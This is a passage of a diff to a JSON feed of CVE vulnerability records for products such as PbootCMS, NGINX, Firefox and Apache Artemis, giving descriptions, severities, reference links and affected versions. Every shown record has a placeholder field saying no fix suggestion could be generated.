+        "Code Injection",
+        "Injection"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4509",
+      "publishedDate": "2026-03-21T06:02:10.118Z",
+      "lastModifiedDate": "2026-03-24T14:04:06.713Z",
+      "description": "A security flaw has been discovered in PbootCMS up to 3.2.12. This affects an unknown function of the file core/function/file.php of the component File Upload. The manipulation of the argument black results in incomplete blacklist. The attack may be launched remotely. The exploit has been released to the public and may be used for attacks.",
+      "severity": 6.3,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352075",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352075",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.773901",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/zzj-create/cvetest/blob/main/VULN-04_DANGEROUS_FILE_UPLOAD_REPORT_EN.md",
+          "type": "poc"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "n/a",
+          "product": "PbootCMS",
+          "versions": [
+            {
+              "version": "3.2.0",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.1",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.2",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.3",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.4",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.5",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.6",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.7",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.8",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.9",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.10",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.11",
+              "status": "affected"
+            },
+            {
+              "version": "3.2.12",
+              "status": "affected"
+            }
+          ],
+          "cpes": [
+            "cpe:2.3:a:pbootcms:pbootcms:*:*:*:*:*:*:*:*"
+          ],
+          "modules": [
+            "File Upload"
+          ]
+        }
+      ],
+      "problemType": [
+        "Incomplete Blacklist",
+        "Permissive List of Allowed Inputs"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25585",
+      "publishedDate": "2026-03-22T00:11:07.399Z",
+      "lastModifiedDate": "2026-03-24T14:29:22.920Z",
+      "description": "Deluge 1.3.15 contains a denial of service vulnerability that allows local attackers to crash the application by supplying an excessively long string in the Webseeds field. Attackers can paste a buffer of 5000 bytes into the Webseeds field during torrent creation to trigger an application crash.",
+      "severity": 6.2,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46884",
+          "type": "poc"
+        },
+        {
+          "url": "https://dev.deluge-torrent.org/",
+          "type": "reference"
+        },
+        {
+          "url": "http://download.deluge-torrent.org/windows/deluge-1.3.15-win32-py2.7.exe",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/deluge-denial-of-service-via-webseeds-field",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Dev",
+          "product": "Deluge",
+          "versions": [
+            {
+              "version": "1.3.15",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Improper Handling of Overlap Between Protected Memory Ranges"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25567",
+      "publishedDate": "2026-03-21T12:47:07.903Z",
+      "lastModifiedDate": "2026-03-24T14:17:40.410Z",
+      "description": "Valentina Studio 9.0.5 Linux contains a buffer overflow vulnerability in the Host field of the connection dialog that allows local attackers to crash the application by supplying an oversized input string. Attackers can trigger the vulnerability by pasting a crafted buffer exceeding 264 bytes into the Host field during server connection attempts, causing a denial of service.",
+      "severity": 6.2,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46439",
+          "type": "poc"
+        },
+        {
+          "url": "https://valentina-db.com/en/",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.valentina-db.com/en/all-downloads/vstudio/current/vstudio_x64_lin-deb?format=raw",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/valentina-studio-linux-buffer-overflow-via-host-field",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Valentina-Db",
+          "product": "Valentina Studio",
+          "versions": [
+            {
+              "version": "9.0.5",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Out-of-bounds Write"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25561",
+      "publishedDate": "2026-03-21T12:47:02.287Z",
+      "lastModifiedDate": "2026-03-24T14:14:59.832Z",
+      "description": "Lyric Maker 2.0.1.0 contains a buffer overflow vulnerability that allows local attackers to crash the application by supplying an excessively long string in the Title field. Attackers can paste a 5000-byte buffer into the Title input field and save the file to trigger a denial of service condition.",
+      "severity": 6.2,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46817",
+          "type": "poc"
+        },
+        {
+          "url": "http://www.jetaudio.com/",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/lyric-maker-denial-of-service-via-buffer-overflow",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Jetaudio",
+          "product": "Lyric Maker",
+          "versions": [
+            {
+              "version": "2.0.1.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Out-of-bounds Write"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25555",
+      "publishedDate": "2026-03-21T12:46:57.219Z",
+      "lastModifiedDate": "2026-03-24T14:13:17.190Z",
+      "description": "TwistedBrush Pro Studio 24.06 contains a denial of service vulnerability in the Script Recorder component that allows local attackers to crash the application by supplying an excessively large buffer. Attackers can paste a malicious string containing 500,000 characters into the Description field of the Script Recorder dialog to trigger an application crash.",
+      "severity": 6.2,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46844",
+          "type": "poc"
+        },
+        {
+          "url": "http://www.pixarra.com",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/twistedbrush-pro-studio-script-recorder-denial-of-service",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Pixarra",
+          "product": "TwistedBrush Pro Studio",
+          "versions": [
+            {
+              "version": "24.06",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Incorrect Calculation of Buffer Size"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25549",
+      "publishedDate": "2026-03-21T12:46:52.307Z",
+      "lastModifiedDate": "2026-03-24T14:11:50.064Z",
+      "description": "VeryPDF PCL Converter 2.7 contains a denial of service vulnerability that allows local attackers to crash the application by supplying an excessively long password string. Attackers can trigger a buffer overflow by entering a 3000-byte password in the PDF Security encryption fields, causing the application to crash when processing PCL files.",
+      "severity": 6.2,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46872",
+          "type": "poc"
+        },
+        {
+          "url": "http://www.verypdf.com",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/verypdf-pcl-converter-denial-of-service-via-pdf-security",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Verypdf",
+          "product": "VeryPDF PCL Converter",
+          "versions": [
+            {
+              "version": "2.7",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Out-of-bounds Write"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2019-25544",
+      "publishedDate": "2026-03-21T12:46:48.415Z",
+      "lastModifiedDate": "2026-03-24T14:31:19.687Z",
+      "description": "Pidgin 2.13.0 contains a denial of service vulnerability that allows local attackers to crash the application by providing an excessively long username string during account creation. Attackers can input a buffer of 1000 characters in the username field and trigger a crash when joining a chat, causing the application to become unavailable.",
+      "severity": 6.2,
+      "references": [
+        {
+          "url": "https://www.exploit-db.com/exploits/46930",
+          "type": "poc"
+        },
+        {
+          "url": "https://pidgin.im/",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.vulncheck.com/advisories/pidgin-denial-of-service-via-malformed-username",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "Pidgin",
+          "product": "Pidgin",
+          "versions": [
+            {
+              "version": "2.13.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "Reliance on Untrusted Inputs in a Security Decision"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33853",
+      "publishedDate": "2026-03-24T05:56:33.223Z",
+      "lastModifiedDate": "2026-03-24T14:15:25.078Z",
+      "description": "NULL Pointer Dereference vulnerability in MolotovCherry Android-ImageMagick7.This issue affects Android-ImageMagick7: before 7.1.2-10.",
+      "severity": 5.5,
+      "references": [
+        {
+          "url": "https://github.com/MolotovCherry/Android-ImageMagick7/pull/183",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "MolotovCherry",
+          "product": "Android-ImageMagick7",
+          "collectionURL": "https://github.com/MolotovCherry/Android-ImageMagick7",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "7.1.2-10",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-476 NULL Pointer Dereference"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-27131",
+      "publishedDate": "2026-03-23T19:04:37.417Z",
+      "lastModifiedDate": "2026-03-24T14:09:08.984Z",
+      "description": "The Sprig Plugin for Craft CMS is a reactive Twig component framework for Craft CMS. Starting in version 2.0.0 and prior to versions 2.15.2 and 3.15.2, admin users, and users with explicit permission to access the Sprig Playground, could potentially expose the security key, credentials, and other sensitive configuration data, in addition to running the `hashData()` signing function. This issue was mitigated in versions 3.15.2 and 2.15.2 by disabling access to the Sprig Playground entirely when `devMode` is disabled, by default. It is possible to override this behavior using a new `enablePlaygroundWhenDevModeDisabled` that defaults to `false`.",
+      "severity": 5.5,
+      "references": [
+        {
+          "url": "https://github.com/putyourlightson/craft-sprig/security/advisories/GHSA-m59h-42jf-cphr",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/putyourlightson/craft-sprig/commit/09c9da2ffb45a8857829f3390ae2578e26cfe03b",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/putyourlightson/craft-sprig/commit/db18c46f6dc5603828aa321a3a615adbd677d475",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "putyourlightson",
+          "product": "craft-sprig",
+          "versions": [
+            {
+              "version": ">= 3.0.0, < 3.15.2",
+              "status": "affected"
+            },
+            {
+              "version": ">= 2.0.0, < 2.15.2",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+        "CWE-489: Active Debug Code"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-28755",
+      "publishedDate": "2026-03-24T14:13:26.502Z",
+      "lastModifiedDate": "2026-03-24T14:13:26.502Z",
+      "description": "NGINX Plus and NGINX Open Source have a vulnerability in the ngx_stream_ssl_module due to the improper handling of revoked certificates when configured with ssl_verify_client on and ssl_ocsp on, allowing the TLS handshake to succeed even after an OCSP check identifies the certificate as revoked.   \n\n\nNote: Software versions which have reached End of Technical Support (EoTS) are not evaluated.",
+      "severity": 5.4,
+      "references": [
+        {
+          "url": "https://my.f5.com/manage/s/article/K000160368",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "defaultStatus": "unknown",
+          "modules": [
+            "ngx_stream_ssl_module"
+          ],
+          "product": "NGINX Open Source",
+          "vendor": "F5",
+          "versions": [
+            {
+              "lessThan": "1.29.7",
+              "status": "affected",
+              "version": "1.29.0",
+              "versionType": "semver"
+            },
+            {
+              "lessThan": "1.28.3",
+              "status": "affected",
+              "version": "1.27.2",
+              "versionType": "semver"
+            }
+          ]
+        },
+        {
+          "defaultStatus": "unknown",
+          "modules": [
+            "ngx_stream_ssl_module"
+          ],
+          "product": "NGINX Plus",
+          "vendor": "F5",
+          "versions": [
+            {
+              "lessThan": "R36 P3",
+              "status": "affected",
+              "version": "R36",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "R35 P2",
+              "status": "affected",
+              "version": "R35",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "*",
+              "status": "affected",
+              "version": "R34",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "*",
+              "status": "affected",
+              "version": "R33",
+              "versionType": "custom"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-863 Incorrect Authorization"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4751",
+      "publishedDate": "2026-03-24T05:37:44.416Z",
+      "lastModifiedDate": "2026-03-24T14:29:05.841Z",
+      "description": "NULL Pointer Dereference vulnerability in tmate-io tmate.This issue affects tmate: before 2.4.0.",
+      "severity": 5.3,
+      "references": [
+        {
+          "url": "https://github.com/tmate-io/tmate/pull/328",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "tmate-io",
+          "product": "tmate",
+          "collectionURL": "https://github.com/tmate-io/tmate",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.4.0",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-476 NULL Pointer Dereference"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-33688",
+      "publishedDate": "2026-03-23T18:43:59.276Z",
+      "lastModifiedDate": "2026-03-24T14:10:04.402Z",
+      "description": "WWBN AVideo is an open source video platform. In versions up to and including 26.0, the password recovery endpoint at `objects/userRecoverPass.php` performs user existence and account status checks before validating the captcha. This allows an unauthenticated attacker to enumerate valid usernames and determine whether accounts are active, inactive, or banned — at scale and without solving any captcha — by observing three distinct JSON error responses. Commit e42f54123b460fd1b2ee01f2ce3d4a386e88d157 contains a patch.",
+      "severity": 5.3,
+      "references": [
+        {
+          "url": "https://github.com/WWBN/AVideo/security/advisories/GHSA-m99f-mmvg-3xmx",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/WWBN/AVideo/commit/e42f54123b460fd1b2ee01f2ce3d4a386e88d157",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "WWBN",
+          "product": "AVideo",
+          "versions": [
+            {
+              "version": "<= 26.0",
+              "status": "affected"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-204: Observable Response Discrepancy"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4530",
+      "publishedDate": "2026-03-21T23:32:10.938Z",
+      "lastModifiedDate": "2026-03-24T14:26:23.607Z",
+      "description": "A security flaw has been discovered in apconw Aix-DB up to 1.2.3. This impacts an unknown function of the file agent/text2sql/rag/terminology_retriever.py. Performing a manipulation of the argument Description results in sql injection. The attack requires a local approach. The exploit has been released to the public and may be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "severity": 5.3,
+      "references": [
+        {
+          "url": "https://vuldb.com/?id.352318",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?ctiid.352318",
+          "type": "reference"
+        },
+        {
+          "url": "https://vuldb.com/?submit.774072",
+          "type": "reference"
+        },
+        {
+          "url": "https://github.com/Ka7arotto/cve/blob/main/Aix-DB-nl2sql.md",
+          "type": "poc"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "apconw",
+          "product": "Aix-DB",
+          "versions": [
+            {
+              "version": "1.2.0",
+              "status": "affected"
+            },
+            {
+              "version": "1.2.1",
+              "status": "affected"
+            },
+            {
+              "version": "1.2.2",
+              "status": "affected"
+            },
+            {
+              "version": "1.2.3",
               "status": "affected"
             }
           ]
@@ -675,81 +1909,898 @@
       "fix_suggestion": "无法生成修复建议"
     },
     {
-      "id": "CVE-2019-25645",
-      "publishedDate": "2026-03-24T11:27:15.914Z",
-      "lastModifiedDate": "2026-03-24T13:00:53.933Z",
-      "description": "WinAVI iPod/3GP/MP4/PSP Converter 4.4.2 contains a denial of service vulnerability that allows local attackers to crash the application by processing malformed AVI files. Attackers can create a specially crafted AVI file with an oversized buffer and load it through the Convert to iPhone function to trigger an application crash.",
-      "severity": 6.2,
+      "id": "CVE-2026-28753",
+      "publishedDate": "2026-03-24T14:13:26.107Z",
+      "lastModifiedDate": "2026-03-24T14:13:26.107Z",
+      "description": "NGINX Plus and NGINX Open Source have a vulnerability in the ngx_mail_smtp_module due to the improper handling of CRLF sequences in DNS responses. This allows an attacker-controlled DNS server to inject arbitrary headers into SMTP upstream requests, leading to potential request manipulation. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.",
+      "severity": 3.7,
       "references": [
         {
-          "url": "https://www.exploit-db.com/exploits/46554",
-          "type": "poc"
-        },
-        {
-          "url": "http://www.winavi.com",
-          "type": "reference"
-        },
-        {
-          "url": "http://www.winavi.com/user/download/WinAVI_iPod_3GP_MP4_PSP_Converter.exe",
-          "type": "reference"
-        },
-        {
-          "url": "https://www.vulncheck.com/advisories/winavi-ipod-3gp-mp4-psp-converter-denial-of-service",
+          "url": "https://my.f5.com/manage/s/article/K000160367",
           "type": "reference"
         }
       ],
       "affected": [
         {
-          "vendor": "Winavi",
-          "product": "WinAVI iPod/3GP/MP4/PSP Converter",
+          "defaultStatus": "unknown",
+          "modules": [
+            "ngx_mail_proxy_module"
+          ],
+          "product": "NGINX Open Source",
+          "vendor": "F5",
           "versions": [
             {
-              "version": "4.4.2",
+              "lessThan": "1.29.7",
+              "status": "affected",
+              "version": "1.29.0",
+              "versionType": "semver"
+            },
+            {
+              "lessThan": "1.28.3",
+              "status": "affected",
+              "version": "0.6.27",
+              "versionType": "semver"
+            }
+          ]
+        },
+        {
+          "defaultStatus": "unknown",
+          "modules": [
+            "ngx_mail_proxy_module"
+          ],
+          "product": "NGINX Plus",
+          "vendor": "F5",
+          "versions": [
+            {
+              "lessThan": "R36 P3",
+              "status": "affected",
+              "version": "R36",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "R35 P2",
+              "status": "affected",
+              "version": "R35",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "*",
+              "status": "affected",
+              "version": "R34",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "*",
+              "status": "affected",
+              "version": "R33",
+              "versionType": "custom"
+            },
+            {
+              "lessThan": "R32 P5",
+              "status": "affected",
+              "version": "R32",
+              "versionType": "custom"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-93 Improper Neutralization of CRLF Sequences ('CRLF Injection')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4684",
+      "publishedDate": "2026-03-24T12:30:20.420Z",
+      "lastModifiedDate": "2026-03-24T14:13:41.950Z",
+      "description": "Race condition, use-after-free in the Graphics: WebRender component. This vulnerability affects Firefox < 149, Firefox ESR < 115.34, and Firefox ESR < 140.9.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2011129",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.mozilla.org/security/advisories/mfsa2026-20/",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.mozilla.org/security/advisories/mfsa2026-21/",
+          "type": "reference"
+        },
+        {
+          "url": "https://www.mozilla.org/security/advisories/mfsa2026-22/",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "product": "Firefox",
+          "vendor": "Mozilla",
+          "versions": [
+            {
+              "lessThan": "149",
+              "status": "affected",
+              "version": "unspecified",
+              "versionType": "custom"
+            }
+          ]
+        },
+        {
+          "product": "Firefox ESR",
+          "vendor": "Mozilla",
+          "versions": [
+            {
+              "lessThan": "115.34",
+              "status": "affected",
+              "version": "unspecified",
+              "versionType": "custom"
+            }
+          ]
+        },
+        {
+          "product": "Firefox ESR",
+          "vendor": "Mozilla",
+          "versions": [
+            {
+              "lessThan": "140.9",
+              "status": "affected",
+              "version": "unspecified",
+              "versionType": "custom"
+            }
+          ]
+        }
+      ],
+      "problemType": [],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2025-64998",
+      "publishedDate": "2026-03-24T11:25:58.183Z",
+      "lastModifiedDate": "2026-03-24T14:06:08.395Z",
+      "description": "Exposure of session signing secret in Checkmk <2.4.0p23, <2.3.0p45 and 2.2.0 allows an administrator of a remote site with config sync enabled to hijack sessions on the central site by forging session cookies.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://checkmk.com/werk/18954",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "defaultStatus": "unaffected",
+          "product": "Checkmk",
+          "vendor": "Checkmk GmbH",
+          "versions": [
+            {
+              "lessThan": "2.4.0p23",
+              "status": "affected",
+              "version": "2.4.0",
+              "versionType": "semver"
+            },
+            {
+              "lessThan": "2.3.0p45",
+              "status": "affected",
+              "version": "2.3.0",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "2.2.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-522: Insufficiently Protected Credentials"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4649",
+      "publishedDate": "2026-03-24T08:15:16.512Z",
+      "lastModifiedDate": "2026-03-24T14:09:36.077Z",
+      "description": "Apache Artemis before version 2.52.0 is affected by an authentication bypass flaw which allows reading all messages exchanged via the broker and injection of new message ( CVE-2026-27446 https://www.cve.org/CVERecord ). Since KNIME Business Hub uses Apache Artemis it is also affected by the issue. However, since Apache Artemis is not exposed to the outside it requires at least normal user privileges and the ability to execute workflows in an executor. Such a user can install and register a federated mirror without authentication to the original Apache Artemis instance and thereby read all internal messages and inject new messages.\n\nThe issue affects all versions of KNIME Business Hub. A fixed version of Apache Artemis is shipped with versions 1.18.0, 1.17.4, and 1.16.3.\n\nWe recommend updating to a fixed version as soon as possible since no workaround is known.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://www.knime.com/security/advisories#CVE-2026-4649",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "KNIME",
+          "product": "KNIME Business Hub",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "1.17.0",
+              "lessThan": "1.17.4",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "1.16.0",
+              "lessThan": "1.16.3",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0.0.0",
+              "lessThan": "1.15.2",
+              "versionType": "semver"
+            }
+          ],
+          "defaultStatus": "unaffected"
+        }
+      ],
+      "problemType": [
+        "CWE-306 Missing authentication for critical function"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-32642",
+      "publishedDate": "2026-03-24T07:53:44.644Z",
+      "lastModifiedDate": "2026-03-24T14:13:23.718Z",
+      "description": "Incorrect Authorization (CWE-863) vulnerability in Apache Artemis, Apache ActiveMQ Artemis exists when an application using the OpenWire protocol attempts to create a non-durable JMS topic subscription on an address that doesn't exist with an authenticated user which has the \"createDurableQueue\" permission but does not have the \"createAddress\" permission and address auto-creation is disabled. In this circumstance, a temporary address will be created whereas the attempt to create the non-durable subscription should instead fail since the user is not authorized to create the corresponding address. When the OpenWire connection is closed the address is removed.\n\nThis issue affects Apache Artemis: from 2.50.0 through 2.52.0; Apache ActiveMQ Artemis: from 2.0.0 through 2.44.0.\n\nUsers are recommended to upgrade to version 2.53.0, which fixes the issue.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://lists.apache.org/thread/4wlrp31ngq2yb54sf4kjb3bl41t4xgtp",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "collectionURL": "https://repo.maven.apache.org/maven2",
+          "defaultStatus": "unaffected",
+          "packageName": "org.apache.artemis:artemis-openwire-protocol",
+          "product": "Apache Artemis",
+          "vendor": "Apache Software Foundation",
+          "versions": [
+            {
+              "lessThanOrEqual": "2.52.0",
+              "status": "affected",
+              "version": "2.50.0",
+              "versionType": "semver"
+            }
+          ]
+        },
+        {
+          "collectionURL": "https://repo.maven.apache.org/maven2",
+          "defaultStatus": "unaffected",
+          "packageName": "org.apache.activemq:artemis-openwire-protocol",
+          "product": "Apache ActiveMQ Artemis",
+          "vendor": "Apache Software Foundation",
+          "versions": [
+            {
+              "lessThanOrEqual": "2.44.0",
+              "status": "affected",
+              "version": "2.0.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "problemType": [
+        "CWE-863 Incorrect Authorization"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4744",
+      "publishedDate": "2026-03-24T03:26:11.751Z",
+      "lastModifiedDate": "2026-03-24T14:32:51.908Z",
+      "description": "Out-of-bounds Read vulnerability in rizonesoft Notepad3 (‎scintilla/oniguruma/src modules). This vulnerability is associated with program files regcomp.C‎.\n\nThis issue affects Notepad3: before 6.25.714.1.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/rizonesoft/Notepad3/pull/5392",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "rizonesoft",
+          "product": "Notepad3",
+          "collectionURL": "https://github.com/rizonesoft/Notepad3",
+          "modules": [
+            "‎scintilla/oniguruma/src"
+          ],
+          "programFiles": [
+            "regcomp.c‎"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "6.25.714.1",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-125 Out-of-bounds Read"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4743",
+      "publishedDate": "2026-03-24T03:25:07.207Z",
+      "lastModifiedDate": "2026-03-24T14:33:16.182Z",
+      "description": "NULL Pointer Dereference vulnerability in taurusxin ncmdump (‎src/utils‎ modules). This vulnerability is associated with program files cJSON.Cpp‎.\n\nThis issue affects ncmdump: before 1.4.0.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/taurusxin/ncmdump/pull/52",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "taurusxin",
+          "product": "ncmdump",
+          "collectionURL": "https://github.com/taurusxin/ncmdump",
+          "modules": [
+            "‎src/utils‎"
+          ],
+          "programFiles": [
+            "cJSON.cpp‎"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "1.4.0",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-476 NULL Pointer Dereference"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4742",
+      "publishedDate": "2026-03-24T03:24:06.460Z",
+      "lastModifiedDate": "2026-03-24T14:33:37.688Z",
+      "description": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') vulnerability in visualfc liteide (liteidex/src/3rdparty/qjsonrpc/src/http-parser modules). This vulnerability is associated with program files http_parser.C.\n\nThis issue affects liteide: before x38.4.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/visualfc/liteide/pull/1325",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "visualfc",
+          "product": "liteide",
+          "collectionURL": "https://github.com/visualfc/liteide",
+          "modules": [
+            "liteidex/src/3rdparty/qjsonrpc/src/http-parser"
+          ],
+          "programFiles": [
+            "http_parser.c"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "x38.4",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-444 Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4741",
+      "publishedDate": "2026-03-24T03:22:36.755Z",
+      "lastModifiedDate": "2026-03-24T14:34:06.274Z",
+      "description": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in TeamJCD JoyConDroid (app/src/main/java/com/rdapps/gamepad/util modules). This vulnerability is associated with program files UnzipUtil.Java‎.\n\nThis issue affects JoyConDroid: through 1.0.93.",
+      "severity": "N/A",
+      "references": [
+        {
+          "url": "https://github.com/TeamJCD/JoyConDroid/pull/124",
+          "type": "reference"
+        }
+      ],
+      "affected": [
+        {
+          "vendor": "TeamJCD",
+          "product": "JoyConDroid",
+          "collectionURL": "https://github.com/TeamJCD/JoyConDroid",
+          "modules": [
+            "app/src/main/java/com/rdapps/gamepad/util"
+          ],
+          "programFiles": [
+            "UnzipUtil.java‎"
+          ],
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThanOrEqual": "1.0.93",
+              "versionType": "git"
+            }
+          ],
+          "defaultStatus": "affected"
+        }
+      ],
+      "problemType": [
+        "CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      ],
+      "fix_suggestion": "无法生成修复建议"
+    },
+    {
+      "id": "CVE-2026-4739",
+      "publishedDate": "2026-03-24T03:19:28.818Z",
+      "lastModifiedDate": "2026-03-24T14:34:50.925Z",
